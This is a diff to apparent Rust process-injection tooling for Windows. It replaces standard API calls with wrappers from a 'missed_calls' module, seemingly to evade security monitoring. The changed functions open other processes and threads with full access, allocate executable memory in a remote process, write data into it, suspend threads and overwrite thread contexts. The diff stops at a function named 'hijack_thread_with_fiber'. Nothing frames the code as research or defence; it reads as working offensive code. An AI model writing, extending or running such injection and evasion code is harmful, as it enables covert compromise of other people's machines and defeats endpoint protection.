@@ -19,49 +19,94 @@ use windows::{
         UI::WindowsAndMessaging::{PostThreadMessageA, WM_NULL},
     },
 };
+use crate::missed_calls;
+use crate::def::ClientId;
+use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
+use std::ptr::null_mut;
+use std::mem::size_of;
 
 // CONTEXT flags constant (CONTEXT_FULL)
 const CONTEXT_ALL: CONTEXT_FLAGS = CONTEXT_FLAGS(0x0010001F);
 
 // open handle to target proc with full access
 pub unsafe fn open_target_process(pid: u32) -> Result<HANDLE> {
-    OpenProcess(PROCESS_ALL_ACCESS, false, pid)
+    let mut h_process: winapi::shared::ntdef::HANDLE = null_mut();
+    let mut client_id = ClientId {
+        unique_process: pid as usize as *mut std::ffi::c_void,
+        unique_thread: null_mut(),
+    };
+    let mut oa: OBJECT_ATTRIBUTES = std::mem::zeroed();
+    oa.Length = size_of::<OBJECT_ATTRIBUTES>() as u32;
+
+    let status = missed_calls::nt_open_process(
+        &mut h_process,
+        windows::Win32::System::Threading::PROCESS_ALL_ACCESS.0, // ACCESS_MASK is u32 in winapi
+        &mut oa,
+        &mut client_id
+    );
+
+    if status != 0 {
+        return Err(windows::core::Error::from_thread());
+    }
+
+    Ok(HANDLE(h_process as *mut std::ffi::c_void))
 }
 
 // open handle to target thread with full access
 pub unsafe fn open_target_thread(thread_id: u32) -> Result<HANDLE> {
-    OpenThread(THREAD_ALL_ACCESS, false, thread_id)
+    let mut h_thread: winapi::shared::ntdef::HANDLE = null_mut();
+    let mut client_id = ClientId {
+        unique_process: null_mut(),
+        unique_thread: thread_id as usize as *mut std::ffi::c_void,
+    };
+    let mut oa: OBJECT_ATTRIBUTES = std::mem::zeroed();
+    oa.Length = size_of::<OBJECT_ATTRIBUTES>() as u32;
+
+    let status = missed_calls::nt_open_thread(
+        &mut h_thread,
+        windows::Win32::System::Threading::THREAD_ALL_ACCESS.0,
+        &mut oa,
+        &mut client_id
+    );
+
+    if status != 0 {
+        return Err(windows::core::Error::from_thread());
+    }
+    Ok(HANDLE(h_thread as *mut std::ffi::c_void))
 }
 
 // allocate memory in remote process
 pub unsafe fn remote_alloc(h_process: HANDLE, size: usize) -> Result<*mut c_void> {
-    let addr = VirtualAllocEx(
-        h_process,
-        None,
-        size,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE,
+    let mut base_addr: *mut c_void = null_mut();
+    let mut region_size: usize = size;
+    let status = missed_calls::nt_allocate_virtual_memory(
+        h_process.0 as *mut winapi::ctypes::c_void,
+        &mut base_addr as *mut *mut std::ffi::c_void as *mut *mut winapi::ctypes::c_void,
+        0,
+        &mut region_size,
+        windows::Win32::System::Memory::MEM_COMMIT.0 | windows::Win32::System::Memory::MEM_RESERVE.0,
+        windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE.0,
     );
 
-    if addr.is_null() {
+    if status != 0 {
         return Err(windows::core::Error::from_thread());
     }
 
-    Ok(addr)
+    Ok(base_addr)
 }
+
 
 // write to remote process memory
 pub unsafe fn remote_write(h_process: HANDLE, address: *const c_void, data: &[u8]) -> Result<()> {
-    let mut bytes_written = 0usize;
-    WriteProcessMemory(
-        h_process,
-        address,
-        data.as_ptr() as *const c_void,
+    let mut bytes_written: usize = 0;
+    let status = missed_calls::nt_write_virtual_memory(
+        h_process.0 as *mut winapi::ctypes::c_void,
+        address as *mut winapi::ctypes::c_void,
+        data.as_ptr() as *mut winapi::ctypes::c_void, // cast const to mut
         data.len(),
-        Some(&mut bytes_written),
-    )?;
-
-    if bytes_written != data.len() {
+        &mut bytes_written,
+    );
+     if status != 0 {
         return Err(windows::core::Error::from_thread());
     }
 
@@ -70,20 +115,22 @@ pub unsafe fn remote_write(h_process: HANDLE, address: *const c_void, data: &[u8
 
 // suspend remote thread
 pub unsafe fn suspend_remote_thread(h_thread: HANDLE) -> Result<u32> {
-    let prev_count = SuspendThread(h_thread);
-    if prev_count == u32::MAX {
+    let mut prev: u32 = 0;
+    let status = missed_calls::nt_suspend_thread(h_thread.0 as *mut winapi::ctypes::c_void, &mut prev);
+    if status != 0 {
         return Err(windows::core::Error::from_thread());
     }
-    Ok(prev_count)
+    Ok(prev)
 }
 
 // resume remote thread
 pub unsafe fn resume_remote_thread(h_thread: HANDLE) -> Result<u32> {
-    let prev_count = ResumeThread(h_thread);
-    if prev_count == u32::MAX {
+    let mut prev: u32 = 0;
+    let status = missed_calls::nt_resume_thread(h_thread.0 as *mut winapi::ctypes::c_void, &mut prev);
+    if status != 0 {
         return Err(windows::core::Error::from_thread());
     }
-    Ok(prev_count)
+    Ok(prev)
 }
 
 #[repr(C, align(16))]
@@ -101,13 +148,24 @@ pub unsafe fn get_remote_thread_context(h_thread: HANDLE) -> Result<AlignedConte
     // set context flags
     (*ctx_ptr).ContextFlags = CONTEXT_ALL;
 
-    GetThreadContext(h_thread, ctx_ptr)?;
+    // cast windows::CONTEXT to winapi::CONTEXT
+    let status = missed_calls::nt_get_context_thread(h_thread.0 as *mut winapi::ctypes::c_void, ctx_ptr as *mut winapi::um::winnt::CONTEXT);
+    
+    if status != 0 { // NT_SUCCESS(0)
+         return Err(windows::core::Error::from_thread());
+    }
     Ok(*aligned.assume_init())
 }
 
 /// set thread context
 pub unsafe fn set_remote_thread_context(h_thread: HANDLE, ctx: &AlignedContext) -> Result<()> {
-    SetThreadContext(h_thread, &ctx.0)
+    // SetThreadContext(h_thread, &ctx.0)
+    let ctx_ptr = &ctx.0 as *const CONTEXT as *mut CONTEXT;
+    let status = missed_calls::nt_set_context_thread(h_thread.0 as *mut winapi::ctypes::c_void, ctx_ptr as *mut winapi::um::winnt::CONTEXT);
+       if status != 0 { // NT_SUCCESS(0)
+         return Err(windows::core::Error::from_thread());
+    }
+    Ok(())
 }
 
 pub unsafe fn hijack_thread_with_fiber(
